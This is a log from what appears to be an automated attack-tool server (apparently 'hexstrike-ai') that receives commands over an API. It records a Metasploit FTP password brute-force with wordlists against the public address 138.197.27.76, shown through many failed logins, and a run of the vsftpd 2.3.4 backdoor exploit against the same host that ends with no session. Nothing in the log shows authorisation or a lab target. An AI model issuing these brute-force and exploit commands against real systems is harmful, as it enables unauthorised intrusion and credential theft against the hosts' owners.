2025-10-24 01:40:30,381 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.4%[0m ETA: 37.9s Speed: 112 B/s | 262.1s | PID: 44299
2025-10-24 01:40:31,182 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.6%[0m ETA: 37.1s Speed: 111 B/s | 262.9s | PID: 44299
2025-10-24 01:40:31,760 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2019 (Incorrect: )
2025-10-24 01:40:31,984 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.9%[0m ETA: 36.3s Speed: 112 B/s | 263.7s | PID: 44299
2025-10-24 01:40:32,785 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.2%[0m ETA: 35.5s Speed: 111 B/s | 264.5s | PID: 44299
2025-10-24 01:40:33,586 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.4%[0m ETA: 34.7s Speed: 111 B/s | 265.3s | PID: 44299
2025-10-24 01:40:34,393 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.7%[0m ETA: 33.9s Speed: 110 B/s | 266.1s | PID: 44299
2025-10-24 01:40:35,194 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.0%[0m ETA: 33.1s Speed: 110 B/s | 266.9s | PID: 44299
2025-10-24 01:40:35,697 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2018 (Incorrect: )
2025-10-24 01:40:35,995 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.2%[0m ETA: 32.3s Speed: 110 B/s | 267.7s | PID: 44299
2025-10-24 01:40:36,796 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.5%[0m ETA: 31.5s Speed: 110 B/s | 268.5s | PID: 44299
2025-10-24 01:40:37,160 - __main__ - INFO - 🔍 Cache MISS for command: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 138.197.27.76; run; exit"
2025-10-24 01:40:37,161 - __main__ - INFO - 🚀 EXECUTING: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 138.197.27.76; run; exit"
2025-10-24 01:40:37,161 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:40:37,161 - __main__ - INFO - 🆔 PROCESS: PID 44577 started
2025-10-24 01:40:37,161 - __main__ - INFO - 🆔 REGISTERED: Process 44577 - msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_...
2025-10-24 01:40:37,162 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44577
2025-10-24 01:40:37,596 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.8%[0m ETA: 30.7s Speed: 110 B/s | 269.3s | PID: 44299
2025-10-24 01:40:37,963 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 0 B/s | 0.8s | PID: 44577
2025-10-24 01:40:38,397 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.0%[0m ETA: 29.9s Speed: 109 B/s | 270.1s | PID: 44299
2025-10-24 01:40:38,764 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 0 B/s | 1.6s | PID: 44577
2025-10-24 01:40:39,197 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.3%[0m ETA: 29.1s Speed: 109 B/s | 270.9s | PID: 44299
2025-10-24 01:40:39,509 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2018 (Incorrect: )
2025-10-24 01:40:39,565 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 0 B/s | 2.4s | PID: 44577
2025-10-24 01:40:39,999 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.6%[0m ETA: 28.3s Speed: 109 B/s | 271.7s | PID: 44299
2025-10-24 01:40:40,076 - __main__ - INFO - 📤 STDOUT: [0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
2025-10-24 01:40:40,077 - __main__ - INFO - 📤 STDOUT: [0mRHOST => 138.197.27.76
2025-10-24 01:40:40,366 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 32 B/s | 3.2s | PID: 44577
2025-10-24 01:40:40,800 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.8%[0m ETA: 27.5s Speed: 109 B/s | 272.5s | PID: 44299
2025-10-24 01:40:41,181 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 26 B/s | 4.0s | PID: 44577
2025-10-24 01:40:41,601 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.1%[0m ETA: 26.7s Speed: 108 B/s | 273.3s | PID: 44299
2025-10-24 01:40:41,982 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 21 B/s | 4.8s | PID: 44577
2025-10-24 01:40:42,402 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.4%[0m ETA: 25.9s Speed: 108 B/s | 274.1s | PID: 44299
2025-10-24 01:40:42,783 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 18 B/s | 5.6s | PID: 44577
2025-10-24 01:40:43,202 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.6%[0m ETA: 25.1s Speed: 108 B/s | 274.9s | PID: 44299
2025-10-24 01:40:43,231 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2018 (Incorrect: )
2025-10-24 01:40:43,584 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.1%[0m Speed: 16 B/s | 6.4s | PID: 44577
2025-10-24 01:40:44,003 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.9%[0m ETA: 24.3s Speed: 108 B/s | 275.7s | PID: 44299
2025-10-24 01:40:44,384 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.4%[0m Speed: 14 B/s | 7.2s | PID: 44577
2025-10-24 01:40:44,803 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.2%[0m ETA: 23.5s Speed: 107 B/s | 276.5s | PID: 44299
2025-10-24 01:40:45,185 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.7%[0m Speed: 13 B/s | 8.0s | PID: 44577
2025-10-24 01:40:45,605 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.4%[0m ETA: 22.7s Speed: 107 B/s | 277.3s | PID: 44299
2025-10-24 01:40:45,985 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.9%[0m Speed: 12 B/s | 8.8s | PID: 44577
2025-10-24 01:40:46,406 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.7%[0m ETA: 21.9s Speed: 107 B/s | 278.1s | PID: 44299
2025-10-24 01:40:46,786 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.2%[0m Speed: 11 B/s | 9.6s | PID: 44577
2025-10-24 01:40:47,134 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2018 (Incorrect: )
2025-10-24 01:40:47,207 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m93.0%[0m ETA: 21.1s Speed: 107 B/s | 278.9s | PID: 44299
2025-10-24 01:40:47,587 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.5%[0m Speed: 10 B/s | 10.4s | PID: 44577
2025-10-24 01:40:48,008 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m93.2%[0m ETA: 20.3s Speed: 107 B/s | 279.7s | PID: 44299
2025-10-24 01:40:48,388 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.7%[0m Speed: 9 B/s | 11.2s | PID: 44577
2025-10-24 01:40:48,811 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m93.5%[0m ETA: 19.5s Speed: 106 B/s | 280.5s | PID: 44299
2025-10-24 01:40:49,189 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.0%[0m Speed: 9 B/s | 12.0s | PID: 44577
2025-10-24 01:40:49,611 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m93.8%[0m ETA: 18.7s Speed: 106 B/s | 281.3s | PID: 44299
2025-10-24 01:40:49,989 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.3%[0m Speed: 8 B/s | 12.8s | PID: 44577
2025-10-24 01:40:50,413 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.0%[0m ETA: 17.9s Speed: 106 B/s | 282.1s | PID: 44299
2025-10-24 01:40:50,435 - __main__ - INFO - 📤 STDOUT: [0m[1m[34m[*][0m 138.197.27.76:21 - Banner: 220 (vsFTPd 3.0.5)
2025-10-24 01:40:50,575 - __main__ - INFO - 📤 STDOUT: [1m[34m[*][0m 138.197.27.76:21 - USER: 331 Please specify the password.
2025-10-24 01:40:50,622 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2018 (Incorrect: )
2025-10-24 01:40:50,790 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.5%[0m Speed: 18 B/s | 13.6s | PID: 44577
2025-10-24 01:40:51,214 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.3%[0m ETA: 17.1s Speed: 106 B/s | 282.9s | PID: 44299
2025-10-24 01:40:51,591 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.8%[0m Speed: 17 B/s | 14.4s | PID: 44577
2025-10-24 01:40:52,015 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.6%[0m ETA: 16.3s Speed: 106 B/s | 283.7s | PID: 44299
2025-10-24 01:40:52,392 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.1%[0m ETA: 284.8s Speed: 16 B/s | 15.2s | PID: 44577
2025-10-24 01:40:52,816 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.8%[0m ETA: 15.5s Speed: 105 B/s | 284.5s | PID: 44299
2025-10-24 01:40:53,171 - __main__ - INFO - 📤 STDOUT: [STATUS] 146.43 tries/min, 1025 tries in 00:07h, 177650 to do in 20:14h, 4 active
2025-10-24 01:40:53,192 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.3%[0m ETA: 284.0s Speed: 15 B/s | 16.0s | PID: 44577
2025-10-24 01:40:53,618 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.1%[0m ETA: 14.7s Speed: 105 B/s | 285.3s | PID: 44299
2025-10-24 01:40:53,993 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.6%[0m ETA: 283.2s Speed: 15 B/s | 16.8s | PID: 44577
2025-10-24 01:40:54,159 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2018 (Incorrect: )
2025-10-24 01:40:54,419 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.4%[0m ETA: 13.9s Speed: 105 B/s | 286.1s | PID: 44299
2025-10-24 01:40:54,794 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m5.9%[0m ETA: 282.4s Speed: 14 B/s | 17.6s | PID: 44577
2025-10-24 01:40:55,219 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.6%[0m ETA: 13.1s Speed: 105 B/s | 286.9s | PID: 44299
2025-10-24 01:40:55,595 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.1%[0m ETA: 281.6s Speed: 13 B/s | 18.4s | PID: 44577
2025-10-24 01:40:56,020 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.9%[0m ETA: 12.3s Speed: 104 B/s | 287.7s | PID: 44299
2025-10-24 01:40:56,396 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.4%[0m ETA: 280.8s Speed: 13 B/s | 19.2s | PID: 44577
2025-10-24 01:40:56,820 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m96.2%[0m ETA: 11.5s Speed: 104 B/s | 288.5s | PID: 44299
2025-10-24 01:40:57,197 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.7%[0m ETA: 280.0s Speed: 12 B/s | 20.0s | PID: 44577
2025-10-24 01:40:57,604 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Fall2018 (Incorrect: )
2025-10-24 01:40:57,621 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m96.4%[0m ETA: 10.7s Speed: 104 B/s | 289.3s | PID: 44299
2025-10-24 01:40:57,997 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m6.9%[0m ETA: 279.2s Speed: 12 B/s | 20.8s | PID: 44577
2025-10-24 01:40:58,422 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m96.7%[0m ETA: 9.9s Speed: 104 B/s | 290.1s | PID: 44299
2025-10-24 01:40:58,800 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.2%[0m ETA: 278.4s Speed: 11 B/s | 21.6s | PID: 44577
2025-10-24 01:40:59,224 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.0%[0m ETA: 9.1s Speed: 104 B/s | 290.9s | PID: 44299
2025-10-24 01:40:59,605 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.5%[0m ETA: 277.6s Speed: 11 B/s | 22.4s | PID: 44577
2025-10-24 01:41:00,027 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.2%[0m ETA: 8.3s Speed: 103 B/s | 291.7s | PID: 44299
2025-10-24 01:41:00,406 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.7%[0m ETA: 276.8s Speed: 11 B/s | 23.2s | PID: 44577
2025-10-24 01:41:00,776 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:fall2018 (Incorrect: )
2025-10-24 01:41:00,827 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.5%[0m ETA: 7.5s Speed: 103 B/s | 292.5s | PID: 44299
2025-10-24 01:41:01,207 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.0%[0m ETA: 276.0s Speed: 10 B/s | 24.0s | PID: 44577
2025-10-24 01:41:01,628 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.8%[0m ETA: 6.7s Speed: 103 B/s | 293.3s | PID: 44299
2025-10-24 01:41:02,008 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.3%[0m ETA: 275.2s Speed: 10 B/s | 24.8s | PID: 44577
2025-10-24 01:41:02,429 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.0%[0m ETA: 5.9s Speed: 103 B/s | 294.1s | PID: 44299
2025-10-24 01:41:02,809 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.5%[0m ETA: 274.4s Speed: 10 B/s | 25.6s | PID: 44577
2025-10-24 01:41:03,230 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.3%[0m ETA: 5.1s Speed: 103 B/s | 294.9s | PID: 44299
2025-10-24 01:41:03,610 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.8%[0m ETA: 273.6s Speed: 9 B/s | 26.4s | PID: 44577
2025-10-24 01:41:04,032 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.6%[0m ETA: 4.3s Speed: 102 B/s | 295.7s | PID: 44299
2025-10-24 01:41:04,411 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.1%[0m ETA: 272.8s Speed: 9 B/s | 27.2s | PID: 44577
2025-10-24 01:41:04,711 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2018 (Incorrect: )
2025-10-24 01:41:04,835 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.8%[0m ETA: 3.5s Speed: 102 B/s | 296.5s | PID: 44299
2025-10-24 01:41:05,214 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.4%[0m ETA: 271.9s Speed: 9 B/s | 28.1s | PID: 44577
2025-10-24 01:41:05,635 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.1%[0m ETA: 2.7s Speed: 102 B/s | 297.3s | PID: 44299
2025-10-24 01:41:06,015 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.6%[0m ETA: 271.1s Speed: 8 B/s | 28.9s | PID: 44577
2025-10-24 01:41:06,436 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.4%[0m ETA: 1.9s Speed: 102 B/s | 298.1s | PID: 44299
2025-10-24 01:41:06,816 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.9%[0m ETA: 270.3s Speed: 8 B/s | 29.7s | PID: 44577
2025-10-24 01:41:07,237 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.6%[0m ETA: 1.1s Speed: 102 B/s | 298.9s | PID: 44299
2025-10-24 01:41:07,577 - __main__ - INFO - 📤 STDOUT: [1m[34m[*][0m Exploit completed, but no session was created.
2025-10-24 01:41:07,618 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.2%[0m ETA: 269.5s Speed: 10 B/s | 30.5s | PID: 44577
2025-10-24 01:41:07,632 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:41:07,639 - __main__ - INFO - 🧹 CLEANUP: Process 44577 removed from registry
2025-10-24 01:41:07,639 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 30.48s
2025-10-24 01:41:07,639 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:41:07,639 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:41:07,639 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:41:07,639 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backd...
2025-10-24 01:41:07,639 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 30.48s
2025-10-24 01:41:07,639 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 313 bytes
2025-10-24 01:41:07,639 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:41:07,639 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:41:07,639 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:41:07,639 - __main__ - INFO - 💾 Cached result for command: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 138.197.27.76; run; exit"
2025-10-24 01:41:07,640 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:41:07] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:41:08,043 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.9%[0m ETA: 0.3s Speed: 101 B/s | 299.7s | PID: 44299
2025-10-24 01:41:08,179 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2018 (Incorrect: )
2025-10-24 01:41:08,328 - __main__ - WARNING - ⏰ TIMEOUT: Command timed out after 300s | Terminating PID 44299
2025-10-24 01:41:08,330 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:41:08,330 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:41:08,330 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:41:08,330 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; ...
2025-10-24 01:41:08,330 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 300.00s [38;5;208m[TIMEOUT][0m
2025-10-24 01:41:08,330 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 30465 bytes
2025-10-24 01:41:08,330 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m -1
2025-10-24 01:41:08,330 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:41:08,330 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:41:08,330 - __main__ - INFO - 💾 Cached result for command: msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 138.197.27.76; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set PASS_FILE /usr/share/wordlists/fasttrack.txt; set THREADS 5; run; exit"
2025-10-24 01:41:08,331 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:41:08] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:41:11,180 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2016 (Incorrect: )
2025-10-24 01:41:14,929 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2015 (Incorrect: )
2025-10-24 01:41:18,226 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2014 (Incorrect: )
2025-10-24 01:41:21,955 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2013 (Incorrect: )
2025-10-24 01:41:24,830 - __main__ - ERROR - 💥 Error in command endpoint: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
2025-10-24 01:41:24,832 - __main__ - ERROR - Traceback (most recent call last):
  File "/opt/hexstrike-ai/hexstrike-env/lib/python3.13/site-packages/werkzeug/wrappers/request.py", line 611, in get_json
    rv = self.json_module.loads(data)
